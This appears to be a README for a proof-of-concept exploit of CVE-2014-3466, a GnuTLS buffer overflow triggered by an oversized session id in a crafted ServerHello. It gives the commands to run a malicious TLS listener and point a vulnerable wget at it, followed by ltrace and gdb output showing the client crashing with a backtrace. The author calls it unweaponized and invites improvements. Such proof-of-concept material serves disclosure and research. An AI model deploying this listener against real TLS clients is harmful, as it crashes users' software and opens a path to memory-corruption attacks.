## Proof of Concept for CVE-2014-3466 (GnuTLS buffer overflow: session id length check)
### Information
See: https://bugzilla.redhat.com/show_bug.cgi?id=1101932

**This is not a weaponized exploit.**

be warned: this python code is ugly, I pretty much handcrafted the ServerHello and spent only about ~~five~~ fifteen minutes on the python part itself. 

feel free to improve this exploit as you wish (keep me in the loop if possible!).

### Example
start the listener with the malicious `ServerHello` code:
```bash
$ python poc.py 4433
```


connect with a client linked to a vulnerable version of GnuTLS (e.g. `wget` on Debian):
```bash
$ ldd $(which wget) 
...
	libnettle.so.4 => /usr/lib/x86_64-linux-gnu/libnettle.so.4 (0x00007fa8a026e000)
	libgnutls.so.28 => /usr/lib/x86_64-linux-gnu/libgnutls.so.28 (0x00007fa89ff5c000)
...

$ ltrace -riS -e gnutls_handshake wget -d https://localhost:4433
...
  0.000096 [0x4308a0] wget->gnutls_handshake(0xdf5380, 4, 0xa4dd30, 0x7f30f2731620 <unfinished ...>
  0.000216 [0x7f30f246b807] SYS_writev(4, 0x7fffc0b9c970, 1)    = 272
  0.000067 [0x7f30f2473a4d] SYS_recvfrom(4, 0xdf7920, 5, 0)     = 5
  0.500357 [0x7f30f2473a4d] SYS_recvfrom(4, 0xdfbad0, 250, 0)   = 250
  0.000095 [0x7f30f2e408f0] --- SIGSEGV (Segmentation fault) ---
  0.004670 [0xffffffffffffffff] +++ killed by SIGSEGV +++

$ sudo apt-get install libgnutls28-dbg
$ gdb --args wget https://localhost:4433
...
(gdb) r
...
(gdb) bt full
...
#0  0x00007ffff79548f0 in _gnutls_supported_ciphersuites (session=session@entry=0xa5e380, 
    cipher_suites=cipher_suites@entry=0x7fffffffd340 <incomplete sequence \366\245>, 
    max_cipher_suite_size=max_cipher_suite_size@entry=512) at ciphersuites.c:1311
#1  0x00007ffff78c759a in _gnutls_client_set_ciphersuite (session=session@entry=0xa5e380, 
    suite=suite@entry=0xa64b5b '\377' <repeats 111 times>) at gnutls_handshake.c:1525
#2  0x00007ffff78cae15 in _gnutls_read_server_hello (datalen=<optimized out>, 
    data=0xa64a70 "\003\001S\213\177c\301\016\035r\n\263\370\247\017\365]ieXB\200\301\373Oۚ\252\004\243\323Kq\307\310", '\377' <repeats 165 times>..., session=0xa5e380) at gnutls_handshake.c:1778
#3  _gnutls_recv_hello (session=session@entry=0xa5e380, 
    data=0xa64a70 "\003\001S\213\177c\301\016\035r\n\263\370\247\017\365]ieXB\200\301\373Oۚ\252\004\243\323Kq\307\310", '\377' <repeats 165 times>..., datalen=<optimized out>) at gnutls_handshake.c:2222
#4  0x00007ffff78cb64f in _gnutls_recv_handshake (session=session@entry=0xa5e380, 
    type=type@entry=GNUTLS_HANDSHAKE_SERVER_HELLO, optional=optional@entry=0, buf=buf@entry=0x0)
    at gnutls_handshake.c:1442
...
```

No time to test this further at the moment, enjoy.

## License
CC0 1.0 (https://creativecommons.org/publicdomain/zero/1.0)
